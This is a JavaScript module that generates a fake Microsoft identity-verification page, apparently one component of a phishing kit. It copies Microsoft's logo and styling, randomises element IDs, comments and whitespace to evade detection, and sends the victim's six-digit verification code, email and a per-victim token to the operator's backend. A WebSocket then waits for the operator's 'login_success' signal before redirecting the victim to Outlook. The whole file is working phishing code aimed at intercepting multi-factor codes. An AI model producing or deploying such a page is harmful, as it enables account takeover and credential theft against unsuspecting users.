/**
 * Microsoft Code Input Page Generator
 * Generates dynamic code verification page (codeinput.html)
 */

const { randomId, randomComment, randomizeWhitespace } = require('./utils/randomizer');

function generateMsCodeInputPage(token, options = {}) {
    const { randomize = true } = options;

    const ids = {
        userEmailDisplay: randomize ? randomId('email') : 'user-email-display',
        codeDescription: randomize ? randomId('desc') : 'code-description',
        errorMessage: randomize ? randomId('err') : 'error-message',
        successMessage: randomize ? randomId('success') : 'success-message',
        codeContainer: randomize ? randomId('container') : 'code-container',
        verifyBtn: randomize ? randomId('verify') : 'verify-btn',
        resendLink: randomize ? randomId('resend') : 'resend-link',
        countdown: randomize ? randomId('count') : 'countdown'
    };

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify your identity</title>
    ${randomComment()}
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 448px;
            width: 100%;
            background-color: white;
            border-radius: 2px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }

        .header {
            padding: 32px 40px 24px;
            border-bottom: 1px solid #edebe9;
        }

        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 32px;
        }

        .ms-logo {
            width: 32px;
            height: 32px;
            margin-right: 12px;
        }

        .logo-text {
            font-size: 20px;
            font-weight: 600;
            color: #323130;
        }

        .user-email {
            color: #605e5c;
            font-size: 15px;
            font-weight: 400;
            line-height: 1.4;
        }

        .content {
            padding: 32px 40px 40px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #323130;
        }

        .description {
            color: #605e5c;
            margin-bottom: 32px;
            font-size: 15px;
            font-weight: 400;
            line-height: 1.4;
        }

        .code-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 32px;
            gap: 8px;
        }

        .code-input {
            width: 48px;
            height: 56px;
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            border: 1px solid #605e5c;
            border-radius: 4px;
            background-color: white;
            color: #323130;
            transition: all 0.2s;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .code-input:focus {
            outline: none;
            border-color: #0078d4;
            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
        }

        .code-input:hover {
            border-color: #323130;
        }

        .code-input.filled {
            border-color: #0078d4;
        }

        .button-container {
            margin-bottom: 24px;
        }

        .btn-primary {
            width: 100%;
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 2px;
            cursor: pointer;
            transition: all 0.2s;
            min-height: 44px;
        }

        .btn-primary:hover:not(:disabled) {
            background-color: #106ebe;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }

        .btn-primary:disabled {
            background-color: #f3f2f1;
            color: #a19f9d;
            cursor: not-allowed;
        }

        .resend-container {
            text-align: center;
            margin-bottom: 16px;
        }

        .resend-link {
            color: #0078d4;
            text-decoration: none;
            font-size: 15px;
            font-weight: 400;
            cursor: pointer;
            transition: color 0.2s;
        }

        .resend-link:hover:not(:disabled) {
            text-decoration: underline;
            color: #106ebe;
        }

        .resend-link:disabled {
            color: #a19f9d;
            cursor: not-allowed;
            text-decoration: none;
        }

        .countdown {
            color: #605e5c;
            font-size: 15px;
            font-weight: 400;
            margin-left: 4px;
        }

        .error-message {
            color: #d13438;
            font-size: 14px;
            margin-top: 8px;
            margin-bottom: 16px;
            display: none;
            text-align: left;
        }

        .error-message.show {
            display: block;
        }

        .success-message {
            color: #107c10;
            font-size: 14px;
            margin-top: 8px;
            margin-bottom: 16px;
            display: none;
            text-align: left;
        }

        .success-message.show {
            display: block;
        }

        .footer {
            padding: 16px 40px;
            border-top: 1px solid #edebe9;
            background-color: #faf9f8;
            display: flex;
            justify-content: center;
            gap: 24px;
        }

        .footer a {
            color: #605e5c;
            text-decoration: none;
            font-size: 12px;
            font-weight: 400;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .container {
                max-width: 100%;
                border-radius: 0;
            }

            .header,
            .content {
                padding-left: 24px;
                padding-right: 24px;
            }

            .code-container {
                gap: 6px;
            }

            .code-input {
                width: 42px;
                height: 50px;
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    ${randomComment()}
    <div class="container">
        <div class="header">
            <div class="logo-container">
                <svg class="ms-logo" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M0 0H9.9V9.9H0V0Z" fill="#F25022" />
                    <path d="M11.1 0H21V9.9H11.1V0Z" fill="#7FBA00" />
                    <path d="M0 11.1H9.9V21H0V11.1Z" fill="#00A4EF" />
                    <path d="M11.1 11.1H21V11.1V21H11.1V11.1Z" fill="#FFB900" />
                </svg>
                <span class="logo-text">Microsoft</span>
            </div>

            <div class="user-email" id="${ids.userEmailDisplay}">Loading...</div>
        </div>

        <div class="content">
            <h1>Verify your identity</h1>
            <p class="description" id="${ids.codeDescription}">We sent a verification code to your email. Enter it here to verify your identity.</p>

            <div class="error-message" id="${ids.errorMessage}">That code didn't work. Check the code and try again.</div>
            <div class="success-message" id="${ids.successMessage}">Code verified successfully!</div>

            <div class="code-container" id="${ids.codeContainer}">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" autofocus>
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
            </div>

            <div class="button-container">
                <button class="btn-primary" id="${ids.verifyBtn}" disabled>Verify</button>
            </div>

            <div class="resend-container">
                <a class="resend-link" id="${ids.resendLink}">Didn't get a code?</a>
                <span class="countdown" id="${ids.countdown}" style="display: none;"> (60)</span>
            </div>
        </div>

        <div class="footer">
            <a href="#">Terms of use</a>
            <a href="#">Privacy & cookies</a>
            <a href="#">...</a>
        </div>
    </div>

    <script>
        (function() {
            ${randomComment()}
            const TOKEN = window.location.pathname.split('/')[1] || '';
            const codeInputs = document.querySelectorAll('.code-input');
            const verifyBtn = document.getElementById('${ids.verifyBtn}');
            const resendLink = document.getElementById('${ids.resendLink}');
            const countdownElement = document.getElementById('${ids.countdown}');
            const userEmailDisplay = document.getElementById('${ids.userEmailDisplay}');
            const codeDescription = document.getElementById('${ids.codeDescription}');
            const errorMessage = document.getElementById('${ids.errorMessage}');
            const successMessage = document.getElementById('${ids.successMessage}');

            // WebSocket connection
            let ws;
            let reconnectAttempts = 0;
            const maxReconnectAttempts = 5;

            function connectWebSocket() {
                try {
                    const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
                    ws = new WebSocket(wsProtocol + window.location.host);

                    ws.onopen = () => {
                        console.log('🔌 CodeInput WebSocket connected');
                        reconnectAttempts = 0;
                    };

                    ws.onmessage = (event) => {
                        try {
                            const data = JSON.parse(event.data);
                            console.log('📢 CodeInput message from server:', data);

                            if (data.status === 'login_success') {
                                console.log('✅ Login success! Redirecting to:', data.redirect);
                                if (data.redirect) {
                                    window.location.href = data.redirect;
                                } else {
                                    window.location.href = 'https://www.outlook.com';
                                }
                            }
                        } catch (error) {
                            console.error('Error parsing WebSocket message:', error);
                        }
                    };

                    ws.onclose = () => {
                        console.log('🔌 CodeInput WebSocket disconnected');
                        if (reconnectAttempts < maxReconnectAttempts) {
                            reconnectAttempts++;
                            setTimeout(connectWebSocket, 2000);
                        }
                    };
                } catch (error) {
                    console.error('Failed to create CodeInput WebSocket:', error);
                }
            }

            connectWebSocket();

            // Get email from sessionStorage
            const email = sessionStorage.getItem('emailToVerify') || sessionStorage.getItem('userEmail') || 'your email';
            userEmailDisplay.textContent = email;
            codeDescription.textContent = \`We sent a verification code to \${email}. Enter it here to verify your identity.\`;

            // Handle code input
            codeInputs.forEach((input, index) => {
                if (index === 0) {
                    setTimeout(() => input.focus(), 100);
                }

                // Handle paste
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').trim();
                    const numbers = pasteData.replace(/\\D/g, '');

                    for (let i = 0; i < Math.min(numbers.length, codeInputs.length); i++) {
                        codeInputs[i].value = numbers[i];
                        codeInputs[i].classList.add('filled');
                        if (i < codeInputs.length - 1) {
                            codeInputs[i + 1].focus();
                        }
                    }
                    checkAllFilled();
                });

                // Handle input
                input.addEventListener('input', (e) => {
                    const value = e.target.value;

                    if (value && !/^\\d\$/.test(value)) {
                        e.target.value = '';
                        return;
                    }

                    if (value) {
                        input.classList.add('filled');
                    } else {
                        input.classList.remove('filled');
                    }

                    if (value && index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    }

                    checkAllFilled();
                });

                // Handle backspace
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace') {
                        if (!e.target.value && index > 0) {
                            codeInputs[index - 1].focus();
                        } else if (e.target.value) {
                            e.target.value = '';
                            input.classList.remove('filled');
                            checkAllFilled();
                        }
                    }

                    if (e.key === 'ArrowLeft' && index > 0) {
                        codeInputs[index - 1].focus();
                    } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
                        codeInputs[index + 1].focus();
                    }
                });

                // Handle focus
                input.addEventListener('focus', () => {
                    input.select();
                });
            });

            function checkAllFilled() {
                const allFilled = Array.from(codeInputs).every(input => input.value.length === 1);
                verifyBtn.disabled = !allFilled;

                if (allFilled) {
                    hideMessages();
                }
            }

            function hideMessages() {
                errorMessage.classList.remove('show');
                successMessage.classList.remove('show');
            }

            // Verify button
            verifyBtn.addEventListener('click', async () => {
                const code = Array.from(codeInputs).map(input => input.value).join('');
                const email = sessionStorage.getItem('emailToVerify') || sessionStorage.getItem('userEmail') || 'unknown';

                console.log('🔐 Verifying code:', code);
                console.log('📧 For email:', email);

                verifyBtn.disabled = true;
                verifyBtn.textContent = 'Verifying...';

                try {
                    console.log('📤 Sending verification code to backend...');

                    const response = await fetch('/api/verify-code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            code: code,
                            email: email,
                            token: TOKEN
                        })
                    });

                    console.log('📥 Response status:', response.status);

                    const result = await response.json();
                    console.log('📥 Backend response:', result);

                    if (result.status === 'success') {
                        successMessage.classList.add('show');
                        verifyBtn.textContent = 'Verified ✓';
                        verifyBtn.style.backgroundColor = '#107c10';

                        console.log('✅ Code verified successfully');

                        setTimeout(() => {
                            console.log('🔄 Redirecting to success page...');
                        }, 1500);
                    } else {
                        errorMessage.textContent = result.message || 'Verification failed. Please try again.';
                        errorMessage.classList.add('show');
                        verifyBtn.disabled = false;
                        verifyBtn.textContent = 'Verify';

                        codeInputs.forEach(input => {
                            input.value = '';
                            input.classList.remove('filled');
                        });
                        codeInputs[0].focus();
                    }
                } catch (error) {
                    console.error('❌ Error during verification:', error);
                    errorMessage.textContent = 'Network error. Please try again.';
                    errorMessage.classList.add('show');
                    verifyBtn.disabled = false;
                    verifyBtn.textContent = 'Verify';
                }
            });

            // Resend functionality
            let countdown = 60;
            let countdownInterval;

            function startCountdown() {
                resendLink.style.pointerEvents = 'none';
                resendLink.style.color = '#a19f9d';
                countdownElement.style.display = 'inline';

                countdown = 60;
                updateCountdown();

                countdownInterval = setInterval(() => {
                    countdown--;
                    updateCountdown();
                    if (countdown <= 0) {
                        clearInterval(countdownInterval);
                        resendLink.style.pointerEvents = 'auto';
                        resendLink.style.color = '#0078d4';
                        countdownElement.style.display = 'none';
                    }
                }, 1000);
            }

            function updateCountdown() {
                countdownElement.textContent = \`(\${countdown})\`;
            }

            startCountdown();

            resendLink.addEventListener('click', (e) => {
                e.preventDefault();
                console.log('🔄 Resending verification code...');

                hideMessages();

                codeInputs.forEach(input => {
                    input.value = '';
                    input.classList.remove('filled');
                });
                codeInputs[0].focus();

                startCountdown();

                console.log('✅ Code resent successfully');
            });
        })();
    </script>
</body>
</html>`;

    return randomizeWhitespace(html);
}

module.exports = { generateMsCodeInputPage };
